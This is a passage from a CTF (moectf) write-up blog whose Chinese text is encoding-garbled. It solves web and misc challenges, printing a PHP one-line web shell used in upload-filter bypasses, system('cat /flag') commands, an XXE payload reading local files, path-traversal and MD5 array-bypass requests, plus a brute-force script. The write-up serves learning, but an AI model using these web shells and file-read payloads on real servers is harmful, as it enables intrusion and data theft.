æœ€é‡è¦çš„æ˜¯ç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œ$secondSegmentä¸ºexpload()åˆ†å¼€çš„æ•°ç»„çš„ç¬¬äºŒä¸ªæ•°ç»„,ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ª.åé¢çš„å­—ç¬¦ä¸²å¿…é¡»ä¸ºpngï¼Œé‚£ä¹ˆæˆ‘ä»¬æäº¤2.pngï¼Œæäº¤æˆåŠŸï¼ŒburpsuiteæŠ“åŒ…ï¼ŒæŠŠ2.pngååŠ ä¸º.phpï¼Œæ˜¯ä¸º2.png.phpï¼Œå¦‚æœç›´æ¥æäº¤2.png.phpï¼Œä¼šè¢«è¯†åˆ«å‡ºæ¥<br>2.png</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥&#x2F;uploads&#x2F;2.png.php<br>è¾“å…¥å‘½ä»¤</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">POST<br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>phpinfo()<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>cat flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;hmmm_improper_filter_DZlYPmdEjJNm86KgZDvyhzd9sQL_5Wep&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure><h2 id="web-â€“-gas-gas-gas"><a href="#web-â€“-gas-gas-gas" class="headerlink" title="web â€“ gas!gas!gas!"></a>web â€“ gas!gas!gas!</h2><p>è¿™é¢˜éœ€è¦å†™ä¸€ä¸ªpythonè„šæœ¬ï¼Œå‡ºé¢˜äººç»™å‡ºäº†è§£é¢˜æ–¹æ³•<br>è½¬å¼¯æ¼‚ç§»æ–¹å‘ç›¸åï¼Œæ²¹é—¨å¤§æŠ“åœ°å°ï¼Œæ²¹é—¨å°æŠ“åœ°å¤§<br>æºç ä¸­å¯ä»¥çœ‹åˆ°åŠ å‡æ²¹é—¨å’Œæ–¹å‘çš„ä»£ç </p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>a=requests.session()<br>url=<span class="hljs-string">&#x27;http://localhost:50262&#x27;</span><br><br><span class="hljs-keyword">data</span>=&#123;<br>    <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&#x27;213&#x27;</span>,<br>    <span class="hljs-string">&quot;steering_control&quot;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&quot;throttle&quot;</span>:<span class="hljs-string">&#x27;0&#x27;</span><br>&#125;<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    s=a.post(url=url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;moectf&#x27;</span> <span class="hljs-built_in">in</span> s.<span class="hljs-keyword">text</span>:<br>        print(s.<span class="hljs-keyword">text</span>)<br>        break<br>    pipei=re.findall(<span class="hljs-string">&quot;&lt;font color=\&quot;</span>red\<span class="hljs-string">&quot;&gt;([\u4e00-\u9fa5ï¼ï¼Œ]+)&quot;</span>,s.<span class="hljs-keyword">text</span>)  # \u4e00-\u9fa5ä¸ºunicodeçš„ä¸­æ–‡ç¼–ç åŒºé—´<br>    print(<span class="hljs-keyword">data</span>)<br>    print(pipei)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;å·¦&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;å³&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;-1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;å°&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;å¤§&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;2&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ä¿æŒ&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;throttle&quot;</span>]=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ç›´è¡Œ&#x27;</span> <span class="hljs-built_in">in</span> pipei[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">data</span>[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&#x27;0&#x27;</span><br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨session.postè€Œä¸æ˜¯requests.post,å› ä¸ºrequests.poståœ¨è°ƒç”¨å®Œæˆåå°±å…³é—­äº†connectï¼Œcookiesä¹Ÿéšç€è¢«åˆ é™¤<br>è€ŒSession.Post() è°ƒç”¨åï¼Œä¿æŒä¼šè¯è¿æ¥ï¼Œä¿å­˜cookiesï¼Œè€Œcookiesè®°å½•äº†ä½ çš„ç”¨æˆ·åã€å¯†ç ã€æµè§ˆçš„ç½‘é¡µã€åœç•™çš„æ—¶é—´ç­‰ç­‰ä¿¡æ¯ã€‚<br>å¦‚æœä½¿ç”¨requests.postï¼Œåœ¨è¿è¡Œå®Œæˆåï¼Œä¸ä¼šå›æ˜¾s.text<br><a href="https://blog.csdn.net/totorobig/article/details/111083521">session.postä¸requests.poståŸæ–‡</a></p><p>flag</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">è¿™æ˜¯ä½ çš„å¥–åŠ±ï¼ moectf&#123;Beautiful_Drifting!!_9nukWEcmlHZu85tOOipl_JpkwH3r2GUf&#125;<br></code></pre></td></tr></table></figure><h2 id="Misc-â€“æ‰“ä¸å¼€çš„å›¾ç‰‡1"><a href="#Misc-â€“æ‰“ä¸å¼€çš„å›¾ç‰‡1" class="headerlink" title="Misc â€“æ‰“ä¸å¼€çš„å›¾ç‰‡1"></a>Misc â€“æ‰“ä¸å¼€çš„å›¾ç‰‡1</h2><p>æ‰“å¼€å‹ç¼©åŒ…ï¼Œæ‰¾åˆ°ä¸€ä¸ªä¸å¸¦æ–‡ä»¶æ ¼å¼çš„flagæ–‡ä»¶ï¼ŒåŠ ä¸Šæ–‡ä»¶åç¼€.jpgå’Œ.pngéƒ½æ˜¾ç¤ºä¸äº†å›¾ç‰‡ï¼Œä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€å‘ç°æœ‰ä¸€ä¸²å­—ç¬¦æ¯”è¾ƒå¯ç–‘</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span> d <span class="hljs-number">6</span> f <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">7</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> b <span class="hljs-number">5</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> f <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> f <span class="hljs-number">7</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">7</span> <span class="hljs-number">2</span> <span class="hljs-number">7</span> <span class="hljs-number">9</span> <span class="hljs-number">5</span> f <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> <span class="hljs-number">5</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">5</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">7</span> d   <br></code></pre></td></tr></table></figure><p>å»é™¤ç©ºæ ¼åé€šè¿‡å­—ç¬¦è§£ç å¾—åˆ°flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">moectf&#123;<span class="hljs-symbol">XDU_i5_v3ry_6e@</span>u2ifu1&#125;<br></code></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼š<br>ç”¨notepad++åå…­è¿›åˆ¶æ‰“å¼€flagï¼Œå‘ç°ç¬¬ä¸€è¡Œå’Œ.jpgæ ¼å¼ååˆ†ç›¸åƒ<br><img src="/images/0E7R4ZZN8TMFB32YR64X.png"><br>æ‰¾ä¸€å¼ ç”µè„‘jpgå›¾ç‰‡ç¬¬ä¸€è¡Œä»£ç <br><img src="/images/SL12F6QWCWLF224SYB5.png"><br>å¯¹æ¯”å‘ç°flagå°‘äº†d8 å’Œffï¼Œæ’å…¥åˆ°ffå’Œe0ä¸­<br>ä¿å­˜é€€å‡ºï¼Œæ”¹ä¸ºjpgæ ¼å¼å³å¯<br>è¿™æ—¶å°±å¯ä»¥çœ‹è§å›¾ç‰‡äº†ï¼Œä½†flagä¸åœ¨å›¾ç‰‡ä¸­<br><img src="/images/TEMQ21D9A3GYH8.png"><br>åŒæ ·çš„ï¼Œä½¿ç”¨å­—ç¬¦è§£ç å³å¯å¾—åˆ°flag</p><h2 id="Misc-â€“æ‰“ä¸å¼€çš„å›¾ç‰‡2"><a href="#Misc-â€“æ‰“ä¸å¼€çš„å›¾ç‰‡2" class="headerlink" title="Misc â€“æ‰“ä¸å¼€çš„å›¾ç‰‡2"></a>Misc â€“æ‰“ä¸å¼€çš„å›¾ç‰‡2</h2><p>ä½¿ç”¨notepad++æ‰“å¼€flag.jpg<br>å‘ç°ç¬¬ä¸€è¡Œç±»ä¼¼äºpngæ ¼å¼<br><img src="/images/DZG2PE7CI2YYFKZUMBM1.png"><br>å†æ‰¾ä¸€ä¸ª.pngåç¼€çš„æ–‡ä»¶è¿›è¡Œå¯¹æ¯”<br><img src="/images/E83NQ3G3OVUEVEU.png"><br>æŠŠå‰4åˆ—æ”¹äº†<br>ä½¿ç”¨pngæˆ–jpgæ ¼å¼æ‰“å¼€<br><img src="/images/RSQ3M1M1GFD17C8.png"></p><h2 id="Misc-â€“ç‹—å­-1-æ™®é€šçš„çŒ«"><a href="#Misc-â€“ç‹—å­-1-æ™®é€šçš„çŒ«" class="headerlink" title="Misc â€“ç‹—å­(1)æ™®é€šçš„çŒ«"></a>Misc â€“ç‹—å­(1)æ™®é€šçš„çŒ«</h2><p>hintä¸­ç»™äº†æç¤ºï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åå…­è¿›åˆ¶æ‰“å¼€<br>ctrl+fç›´æ¥æœmoe<br>æˆåŠŸæ‰¾åˆ°</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;eeeez_f1ag_as_<span class="hljs-built_in">A_G1ft</span>!&#125; <br></code></pre></td></tr></table></figure><p>è®°äº‹æœ¬ä¹Ÿèƒ½æ‰¾åˆ°</p><h2 id="Misc-â€“building-near-lake"><a href="#Misc-â€“building-near-lake" class="headerlink" title="Misc â€“building_near_lake"></a>Misc â€“building_near_lake</h2><p>çœ‹åˆ°tips:è¿™å›¾æ˜¯å¯ä»¥æ”¾å¤§çš„<br>é¦–å…ˆæƒ³åˆ°flagå¯èƒ½è—åœ¨ä»¥æ˜¾ç¤ºçš„å›¾ç‰‡å¤–ï¼Œä¿®æ”¹åˆ†è¾¨ç‡ï¼Œå‘ç°å¹¶æ²¡æœ‰<br>é‚£å°±åˆ©ç”¨äº’è”ç½‘çš„ä¼˜åŠ¿ï¼Œä½¿ç”¨ç™¾åº¦æœå›¾<br><img src="/images/searchbox0xg0.jpg"><br>æå–å…³é”®è¯ï¼Œå¦é—¨å¤§å­¦ï¼Œç¿”å®‰æ ¡åŒºï¼Œæ”¾å¤§å›¾çœ‹è¿™æ˜¯ä¸ªå›¾ä¹¦é¦†ï¼Œç™¾åº¦æœç´¢ç¿”å®‰æ ¡åŒºåªæœ‰ä¸€ä¸ªå›¾ä¹¦é¦†ï¼Œå¯åŠ¨åæ ‡å·¥å…·ï¼Œç»åº¦ä¸º118.312ï¼Œçº¬åº¦ä¸º24.606<br>æ‹æ‘„è®¾å¤‡çš„<em>å‘å¸ƒä¼š</em>æ—¶é—´ï¼ˆ8ä½æ•°å­—ï¼Œå¦‚2018å¹´5æœˆ6æ—¥åˆ™ä¸ºâ€œ20180506â€ï¼‰<br>æ³¨æ„æ˜¯<strong>æ‹æ‘„è®¾å¤‡çš„å‘å¸ƒä¼šæ—¶é—´</strong>ï¼Œè€Œä¸æ˜¯æ‹æ‘„æ—¶é—´ï¼Œæˆ‘ä»¬æŠŠå›¾ç‰‡ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå¯ä»¥æ‰¾åˆ°ç±»ä¼¼çš„æ‰‹æœºå‹å·Redmi K60Eï¼Œç»§ç»­ç™¾åº¦æœç´¢<br><img src="/images/BU4C.png"><br>å°†ä¸‰ä¸ªé—®é¢˜å›ç­”åå¾—åˆ°flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;P<span class="hljs-number">0</span>sT_Y<span class="hljs-number">0</span>uR_Ph<span class="hljs-number">0</span>T<span class="hljs-number">0</span>_wiTh_<span class="hljs-number">0</span>Rigi<span class="hljs-symbol">nal_File_is_n0</span>T_a_<span class="hljs-name">g00</span>d_idea_YlJf!<span class="hljs-name">M3</span>rux&#125;<br></code></pre></td></tr></table></figure><h2 id="webâ€“äº†è§£ä½ çš„åº§é©¾"><a href="#webâ€“äº†è§£ä½ çš„åº§é©¾" class="headerlink" title="webâ€“äº†è§£ä½ çš„åº§é©¾"></a>webâ€“äº†è§£ä½ çš„åº§é©¾</h2><p>ä¸‹ç¿»åˆ°XDU moeCTF Flag è·å¾—ä¿¡æ¯flagæ‰åˆ°æ ¹ç›®å½•é‡Œ<br>ç”¨burpsuiteæŠ“å–åˆ°postï¼Œ<code>xml_content=&lt;xml&gt;&lt;name&gt;XDU moeCTF Flag&lt;/name&gt;&lt;/xml&gt;</code><br>xmlå¯¹åº”çš„æ˜¯xxeæ¼æ´<br>ç”¨ä¸€ä¸ªxxeæ¼æ´æ¨¡æ¿</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">XXE</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">cmd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">yasuo</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;cmd;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">yasuo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½†ä¸èƒ½ç›´æ¥æäº¤ä¸Šå»ï¼Œå¦‚æœæäº¤ä¸Šå»ä¼šæŠ¥é”™<br>ä½¿ç”¨urlç¼–ç (æ‰€æœ‰å­—ç¬¦)<br>ç”¨burpsuiteæäº¤ï¼Œhackbaræœ‰ç‚¹é—®é¢˜</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">post</span>:<br><span class="hljs-attribute">xml_content</span>=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fxml%<span class="hljs-number">20</span>version%<span class="hljs-number">3</span>D%<span class="hljs-number">221</span>%<span class="hljs-number">2</span>E0%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>encoding%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>UTF%<span class="hljs-number">2</span>D8%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>DOCTYPE%<span class="hljs-number">20</span>XXE%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>ENTITY%<span class="hljs-number">20</span>cmd%<span class="hljs-number">20</span>SYSTEM%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>file%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Cyasuo%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Cname%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>cmd%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fname%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fyasuo%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><img src="/images/AJZADKZ93OVD5JGZC.png"></p><p>flag:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">moectf&#123;Which_one_You<span class="hljs-symbol">&#x27;ve_Chosen</span>?XzYkzCjh8V9GublHShh_IiKQF5RMNKwV&#125;<br></code></pre></td></tr></table></figure><h2 id="webâ€“å¤§æµ·æé’ˆ"><a href="#webâ€“å¤§æµ·æé’ˆ" class="headerlink" title="webâ€“å¤§æµ·æé’ˆ"></a>webâ€“å¤§æµ·æé’ˆ</h2><p>é¢˜ç›®å‘Šè¯‰äº†éœ€è¦ä½¿ç”¨<a href="https://cloud.tencent.com/developer/article/1906161">çˆ†ç ´</a>ï¼Œ<br>use &#x2F;?id&#x3D;&lt;1-1000&gt; to connect to different parallel universes<br>(it might seem wired that the index is between 1 and 1000â€¦)<br>è¿›å…¥é¢˜ç›®ä¹Ÿè¯´æ˜äº†flagè—åœ¨è¿™1000ä¸ªé¡µé¢ä¸­<br>éšä¾¿è¾“å…¥ä¸€ä¸ª?id&#x3D;1æŠ“åŒ…<br><img src="/images/KGMZ159ZAFRIMUXN.png"><br>sendåè¿›å…¥intruder<br><img src="/images/BS9PDEN5PUUVQP.png"><br>ä½¿ç”¨sniperæ–¹æ³•çˆ†ç ´id<br>payloadsé…ç½®å¦‚ä¸‹ï¼š<br><img src="/images/XU2SI3KKYR9BPX0.png"><br>å³å¯å¼€å§‹çˆ†ç ´<br>å‘ç°id&#x3D;163 lenä¸åŒ<br><img src="/images/K2P60L3QO95IUT.png"><br>responseæŸ¥çœ‹æ‰¾å‡ºflag</p><p>Flag:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;script_helps_ULOZw7NrjEIKRZ4V&#125;</span><br></code></pre></td></tr></table></figure><h2 id="webâ€“meoå›¾åºŠ"><a href="#webâ€“meoå›¾åºŠ" class="headerlink" title="webâ€“meoå›¾åºŠ"></a>webâ€“meoå›¾åºŠ</h2><p>æœ¬é¢˜ä¼¼ä¹å¯¹æ–‡ä»¶åç¼€æ²¡æœ‰è¿‡æ»¤ï¼Œæäº¤1.phpä¹Ÿå¯ä»¥ï¼Œä½†å®ƒå¯¹å†…å®¹æœ‰ç­›æŸ¥ï¼Œ1.phpä¸­åŠ å…¥GIF89Aä»¥ç»•è¿‡<br>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89A<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥æäº¤çš„ç›®å½•ï¼Œèšå‰‘å’Œå‘½ä»¤æ‰§è¡Œéƒ½ä¸èƒ½ç”¨<br>å³é”®å¤åˆ¶å›¾åƒï¼Œåœ¨ç”µè„‘ä¸Šç”¨è®°äº‹æœ¬æ‰“å¼€<br>å‘ç°äº†æˆ‘ä»¬æ³¨å…¥çš„ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89A<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>éšä¾¿æ”¹æ”¹urlï¼ŒæŠŠnameåˆ æ‰ä¸€ä¸¤ä¸ªæˆ–æ”¹ä¸€æ”¹<br>å‡ºç°æŠ¥é”™ä¿¡æ¯ï¼Œçœ‹çœ‹æœ‰æ— åˆ©ç”¨çš„ç‚¹<br><img src="/images/XW1PKUL52UDXD1V53.png"></p><p>file_get_contentså‡½æ•°å¯ä»¥å¸®åŠ©æˆ‘ä»¬è¯»å–æ–‡ä»¶ä¿¡æ¯<br>payload:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">GET</span>ï¼š<br>images.php?<span class="hljs-built_in">name</span>=../../../<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>å³é”®å¤åˆ¶å›¾åƒï¼Œåœ¨ç”µè„‘ä¸Šç”¨è®°äº‹æœ¬æ‰“å¼€</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">hello~<br>Flag Not Here~<br>Find Somewhere Else~<br><br><br><span class="hljs-comment">&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;</span><br><br>Not Here~~~~~~~~~~~~~ awa<br></code></pre></td></tr></table></figure><p>è¿›å…¥Fl3g_n0t_Here_dont_peek!!!!!.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$param1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param1&#x27;</span>];<br>    <span class="hljs-variable">$param2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param1</span> !== <span class="hljs-variable">$param2</span>) &#123;<br>        <br>        <span class="hljs-variable">$md5Param1</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$param1</span>);<br>        <span class="hljs-variable">$md5Param2</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$param2</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5Param1</span> == <span class="hljs-variable">$md5Param2</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.O!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o??&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O?&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ç®€å•çš„MD5æ¼æ´ï¼Œç›´æ¥æ•°ç»„ç»•è¿‡å³å¯<br>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Get<br>?para<span class="hljs-name">m1</span>[]=<span class="hljs-number">123</span>&amp;para<span class="hljs-name">m2</span>[]=<span class="hljs-number">456</span><br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;oops_file_get_co<span class="hljs-symbol">ntents_controllable_DkqCQ6</span><span class="hljs-name">g402</span>lwjecsaxL<span class="hljs-meta">O7</span>AU<span class="hljs-number">6</span>x-_<span class="hljs-number">7</span><span class="hljs-symbol">n9</span>Ok&#125;<br></code></pre></td></tr></table></figure><h2 id="webâ€“å¤ºå‘½åä¸‰æª"><a href="#webâ€“å¤ºå‘½åä¸‰æª" class="headerlink" title="webâ€“å¤ºå‘½åä¸‰æª"></a>webâ€“å¤ºå‘½åä¸‰æª</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 